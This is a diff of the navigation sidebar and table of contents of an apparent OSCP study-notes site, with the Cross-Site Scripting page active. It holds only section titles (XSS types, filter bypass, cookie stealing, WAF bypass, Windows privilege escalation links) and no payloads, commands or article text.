+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Ports%20%26%20Applications/port-53-dns/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Port 53 - Enumerate DNS
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_16" >
+        
+          
+          <label class="md-nav__link" for="__nav_16" id="__nav_16_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Usernames
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_16_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_16">
+            <span class="md-nav__icon md-icon"></span>
+            Usernames
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Usernames/enum/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Enumerate Usernames
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_17" >
+        
+          
+          <label class="md-nav__link" for="__nav_17" id="__nav_17_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Web Applications
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_17_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_17">
+            <span class="md-nav__icon md-icon"></span>
+            Web Applications
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Web%20Applications/apache-tomcat-fuzzing/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Apache Tomcat Fuzzing
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Web%20Applications/automate-enum/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Automated Enumeration
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Web%20Applications/fuzzing-php/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Fuzzing with PHP
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Web%20Applications/mysql-fuzzing/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    MySQL Database Fuzzing &amp; Testing 🗄️
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Web%20Applications/postgre-fuzzing/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Postgre Sql Fuzzing
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Web%20Applications/sql-injection-fuzzing/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    SQL Injection Fuzzing
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Web%20Applications/web-fuzzing-with-ffuf/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Web Fuzzing Using FFUF 🔍
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Web%20Applications/wordpress/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Fuzzing Wordpress
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_18" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_18" id="__nav_18_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Web Vulneratbilites
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_18_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_18">
+            <span class="md-nav__icon md-icon"></span>
+            Web Vulneratbilites
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../cmd-injection/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Command Injection
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../lfi/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Local File Inclusion (LFI)
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../sql-injection/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Sql injection
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    Cross-Site Scripting (XSS)
+    
+  </span>
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    Cross-Site Scripting (XSS)
+    
+  </span>
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#overview" class="md-nav__link">
+    <span class="md-ellipsis">
+      Overview
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#quick-detection-checklist" class="md-nav__link">
+    <span class="md-ellipsis">
+      Quick Detection Checklist
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#xss-types" class="md-nav__link">
+    <span class="md-ellipsis">
+      XSS Types
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="XSS Types">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1-reflected-xss" class="md-nav__link">
+    <span class="md-ellipsis">
+      1. Reflected XSS
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2-stored-xss" class="md-nav__link">
+    <span class="md-ellipsis">
+      2. Stored XSS
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3-dom-based-xss" class="md-nav__link">
+    <span class="md-ellipsis">
+      3. DOM-Based XSS
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#basic-detection-payloads" class="md-nav__link">
+    <span class="md-ellipsis">
+      Basic Detection Payloads
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Basic Detection Payloads">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#simple-test-characters" class="md-nav__link">
+    <span class="md-ellipsis">
+      Simple Test Characters
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#basic-alert-payloads" class="md-nav__link">
+    <span class="md-ellipsis">
+      Basic Alert Payloads
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#quick-detection" class="md-nav__link">
+    <span class="md-ellipsis">
+      Quick Detection
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#oscp-exam-attack-workflow" class="md-nav__link">
+    <span class="md-ellipsis">
+      OSCP Exam Attack Workflow
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="OSCP Exam Attack Workflow">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#phase-1-identify-injection-points-2-5-min" class="md-nav__link">
+    <span class="md-ellipsis">
+      Phase 1: Identify Injection Points (2-5 min)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#phase-2-test-filter-bypass-5-10-min" class="md-nav__link">
+    <span class="md-ellipsis">
+      Phase 2: Test Filter Bypass (5-10 min)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#phase-3-craft-working-payload-5-15-min" class="md-nav__link">
+    <span class="md-ellipsis">
+      Phase 3: Craft Working Payload (5-15 min)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#phase-4-exploit-for-exam-points-10-20-min" class="md-nav__link">
+    <span class="md-ellipsis">
+      Phase 4: Exploit for Exam Points (10-20 min)
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#context-based-payloads" class="md-nav__link">
+    <span class="md-ellipsis">
+      Context-Based Payloads
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Context-Based Payloads">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#html-context" class="md-nav__link">
+    <span class="md-ellipsis">
+      HTML Context
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#attribute-context" class="md-nav__link">
+    <span class="md-ellipsis">
+      Attribute Context
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#javascript-context" class="md-nav__link">
+    <span class="md-ellipsis">
+      JavaScript Context
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#url-context" class="md-nav__link">
+    <span class="md-ellipsis">
+      URL Context
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#filter-bypass-techniques" class="md-nav__link">
+    <span class="md-ellipsis">
+      Filter Bypass Techniques
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Filter Bypass Techniques">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1-case-manipulation" class="md-nav__link">
+    <span class="md-ellipsis">
+      1. Case Manipulation
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2-encoding" class="md-nav__link">
+    <span class="md-ellipsis">
+      2. Encoding
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3-tag-variations" class="md-nav__link">
+    <span class="md-ellipsis">
+      3. Tag Variations
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#4-bypassing-keyword-filters" class="md-nav__link">
+    <span class="md-ellipsis">
+      4. Bypassing Keyword Filters
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#5-comment-tricks" class="md-nav__link">
+    <span class="md-ellipsis">
+      5. Comment Tricks
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#6-null-byte-injection" class="md-nav__link">
+    <span class="md-ellipsis">
+      6. Null Byte Injection
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#polyglot-payloads" class="md-nav__link">
+    <span class="md-ellipsis">
+      Polyglot Payloads
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#oscp-specific-exploitation" class="md-nav__link">
+    <span class="md-ellipsis">
+      OSCP-Specific Exploitation
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="OSCP-Specific Exploitation">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1-cookie-stealing" class="md-nav__link">
+    <span class="md-ellipsis">
+      1. Cookie Stealing
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2-session-hijacking" class="md-nav__link">
+    <span class="md-ellipsis">
+      2. Session Hijacking
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3-keylogger" class="md-nav__link">
+    <span class="md-ellipsis">
+      3. Keylogger
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#4-credential-harvesting" class="md-nav__link">
+    <span class="md-ellipsis">
+      4. Credential Harvesting
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#5-phishing-page-injection" class="md-nav__link">
+    <span class="md-ellipsis">
+      5. Phishing Page Injection
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#6-beef-hook" class="md-nav__link">
+    <span class="md-ellipsis">
+      6. BeEF Hook
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#7-admin-action-exploitation" class="md-nav__link">
+    <span class="md-ellipsis">
+      7. Admin Action Exploitation
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#testing-methodology" class="md-nav__link">
+    <span class="md-ellipsis">
+      Testing Methodology
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Testing Methodology">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#step-1-map-input-points" class="md-nav__link">
+    <span class="md-ellipsis">
+      Step 1: Map Input Points
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-2-test-basic-payloads" class="md-nav__link">
+    <span class="md-ellipsis">
+      Step 2: Test Basic Payloads
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-3-determine-context" class="md-nav__link">
+    <span class="md-ellipsis">
+      Step 3: Determine Context
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-4-bypass-filters" class="md-nav__link">
+    <span class="md-ellipsis">
+      Step 4: Bypass Filters
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-5-craft-final-exploit" class="md-nav__link">
+    <span class="md-ellipsis">
+      Step 5: Craft Final Exploit
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#tools-for-xss-testing" class="md-nav__link">
+    <span class="md-ellipsis">
+      Tools for XSS Testing
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Tools for XSS Testing">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#manual-testing" class="md-nav__link">
+    <span class="md-ellipsis">
+      Manual Testing
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#automated-tools" class="md-nav__link">
+    <span class="md-ellipsis">
+      Automated Tools
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#common-injection-points" class="md-nav__link">
+    <span class="md-ellipsis">
+      Common Injection Points
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Common Injection Points">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#url-parameters" class="md-nav__link">
+    <span class="md-ellipsis">
+      URL Parameters
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#form-inputs" class="md-nav__link">
+    <span class="md-ellipsis">
+      Form Inputs
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#http-headers" class="md-nav__link">
+    <span class="md-ellipsis">
+      HTTP Headers
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#file-uploads" class="md-nav__link">
+    <span class="md-ellipsis">
+      File Uploads
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#waf-bypass-techniques" class="md-nav__link">
+    <span class="md-ellipsis">
+      WAF Bypass Techniques
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="WAF Bypass Techniques">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1-character-encoding-bypass" class="md-nav__link">
+    <span class="md-ellipsis">
+      1. Character Encoding Bypass
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2-mixed-case" class="md-nav__link">
+    <span class="md-ellipsis">
+      2. Mixed Case
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3-uncommon-tags" class="md-nav__link">
+    <span class="md-ellipsis">
+      3. Uncommon Tags
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#4-obfuscation" class="md-nav__link">
+    <span class="md-ellipsis">
+      4. Obfuscation
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#quick-payload-reference" class="md-nav__link">
+    <span class="md-ellipsis">
+      Quick Payload Reference
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Quick Payload Reference">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#shortest-payloads" class="md-nav__link">
+    <span class="md-ellipsis">
+      Shortest Payloads
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#cookie-stealers" class="md-nav__link">
+    <span class="md-ellipsis">
+      Cookie Stealers
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#keyloggers" class="md-nav__link">
+    <span class="md-ellipsis">
+      Keyloggers
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#page-redirectors" class="md-nav__link">
+    <span class="md-ellipsis">
+      Page Redirectors
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#oscp-exam-strategy" class="md-nav__link">
+    <span class="md-ellipsis">
+      OSCP Exam Strategy
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="OSCP Exam Strategy">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#time-management" class="md-nav__link">
+    <span class="md-ellipsis">
+      Time Management
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#checklist-during-exam" class="md-nav__link">
+    <span class="md-ellipsis">
+      Checklist During Exam
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#pro-tips-for-oscp" class="md-nav__link">
+    <span class="md-ellipsis">
+      Pro Tips for OSCP
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#practice-resources" class="md-nav__link">
+    <span class="md-ellipsis">
+      Practice Resources
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Practice Resources">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#online-labs" class="md-nav__link">
+    <span class="md-ellipsis">
+      Online Labs
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#payload-lists" class="md-nav__link">
+    <span class="md-ellipsis">
+      Payload Lists
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#summary" class="md-nav__link">
+    <span class="md-ellipsis">
+      Summary
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Summary">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#remember" class="md-nav__link">
+    <span class="md-ellipsis">
+      Remember:
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#quick-command-reference" class="md-nav__link">
+    <span class="md-ellipsis">
+      Quick Command Reference
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_19" >
+        
+          
+          <label class="md-nav__link" for="__nav_19" id="__nav_19_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Windows
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_19_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_19">
+            <span class="md-nav__icon md-icon"></span>
+            Windows
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Windows/1-priv-esc/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Windows Privilege Escalation Guide
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Windows/av-bypass/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    AV Bypass
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Windows/download-file/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Download file to windows
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Windows/file-permissions/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    File Permissions On Windows
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Windows/kernel-exploit/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Kernel Exploits
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Windows/mimkatz/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Usage of Mimkatz
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Windows/powershell/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Powershell Commands
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Windows/reverse-shell/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Windows Reverse Shell
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Windows/service-abuse/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Windows Service Abuse
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Windows/uac/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    UAC Windows
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Windows/windows-shell-help/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Windows Shell Helpul commands
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Windows/winpeas/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Winpeas Usage
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_19_13" >
+        
+          
+          <label class="md-nav__link" for="__nav_19_13" id="__nav_19_13_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Groups
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_19_13_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_19_13">
+            <span class="md-nav__icon md-icon"></span>
+            Groups
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Windows/Groups/server-operator-group/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Server Operator Group
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_19_14" >
+        
+          
+          <label class="md-nav__link" for="__nav_19_14" id="__nav_19_14_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Privileges
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_19_14_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_19_14">
+            <span class="md-nav__icon md-icon"></span>
+            Privileges
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Windows/Privileges/SeBackupPrivilege/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Windows - SeBackupPrivilege
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Windows/Privileges/SeImporsornatePriv/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    SeImpersonatePrivilege
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#overview" class="md-nav__link">
+    <span class="md-ellipsis">
+      Overview
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#quick-detection-checklist" class="md-nav__link">
+    <span class="md-ellipsis">
+      Quick Detection Checklist
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#xss-types" class="md-nav__link">
+    <span class="md-ellipsis">
+      XSS Types
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="XSS Types">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1-reflected-xss" class="md-nav__link">
+    <span class="md-ellipsis">
+      1. Reflected XSS
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2-stored-xss" class="md-nav__link">
+    <span class="md-ellipsis">
+      2. Stored XSS
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3-dom-based-xss" class="md-nav__link">
+    <span class="md-ellipsis">
+      3. DOM-Based XSS
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#basic-detection-payloads" class="md-nav__link">
+    <span class="md-ellipsis">
+      Basic Detection Payloads
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Basic Detection Payloads">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#simple-test-characters" class="md-nav__link">
+    <span class="md-ellipsis">
+      Simple Test Characters
+    </span>
